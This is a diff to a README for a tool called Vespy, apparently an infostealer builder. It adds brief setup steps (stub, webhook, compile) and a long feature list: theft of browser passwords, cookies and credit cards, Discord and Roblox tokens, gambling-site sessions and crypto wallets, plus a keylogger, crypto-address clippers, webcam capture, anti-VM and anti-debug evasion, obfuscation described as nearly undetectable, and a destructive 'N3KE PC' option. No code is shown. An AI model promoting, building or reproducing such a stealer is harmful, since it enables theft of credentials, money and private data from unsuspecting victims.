@@ -47,3 +47,137 @@ Make sure to install pip while downloading python (in python setup)
 Install requirements using start.bat
 
 Setup your stub, webhook and compile
+
+<h3>Vespy Features</h3>
+    
+Desktop Screenshot
+    
+Webcam Screenshot
+    
+Computer Info
+    
+HWID
+    
+Windows Product Key
+    
+Browsers
+    
+Edge + Profiles, Chrome + Profiles, Brave + Profiles, Opera, Opera GX
+    
+Importable Cookies Json (Cookiebro Extension)
+    
+Passwords
+    
+Cr3dit C4rds
+    
+History
+    
+Autofill
+    
+Downloads
+    
+Discord Token
+    
+Discord Injection
+    
+Discord DMs Spreading
+    
+All Browsers Roblox Cookies
+    
+Registry Roblox Cookie
+    
+Roblox Gambling sites
+    
+Roblox Account Info
+    
+Rblxwild.com Tokens
+    
+Rblxroll.com Tokens
+    
+Betbux.gg Tokens
+    
+Rbxflip.com Tokens
+    
+Bloxflip.com tokens
+    
+Telegram tdata Folder
+    
+Exodus
+    
+Metamask
+    
+Coinbase Wallet
+    
+Electrum
+    
+Bitcoin Wallet
+    
+Guarda
+    
+Atomic
+    
+Bitpay
+    
+Coinomi
+    
+Armory
+    
+sportsbet.io Cookies
+    
+bets.io Cookies
+    
+bitcasino.io Cookies
+    
+mystake.bet Cookies
+    
+stake.com Cookies
+    
+wild.io Cookies
+    
+coinzino.io Cookies
+    
+winz.io Cookies
+    
+luckyblock.com Tokens
+    
+Targetted files in all paths
+    
+Minecraft Session Files
+    
+IP
+    
+WiFi
+    
+BTC Clipper
+    
+ETH Clipper
+    
+Startup
+    
+VPN
+    
+Mullvad Account Number
+    
+Keylogger
+    
+Current Site / Window
+    
+Keys Captured
+    
+Current Window Screenshot
+    
+Obfuscation (almost FUD)
+    
+Anti Debug
+    
+Anti VM
+    
+Webhook Junk
+    
+Error Message
+    
+Reboot PC
+    
+N3KE PC
+    
+Hide Executable
